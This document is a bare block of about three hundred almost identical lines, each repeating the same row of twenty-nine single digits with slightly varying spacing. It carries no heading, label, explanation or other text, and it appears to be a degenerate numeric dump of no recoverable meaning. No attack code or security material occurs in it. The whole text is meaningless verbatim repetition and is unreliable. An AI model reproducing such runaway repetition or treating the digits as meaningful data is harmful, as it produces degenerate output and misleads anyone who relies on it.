   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1   9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1   9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0   2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0  2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0  2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0  2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0  2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5  0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
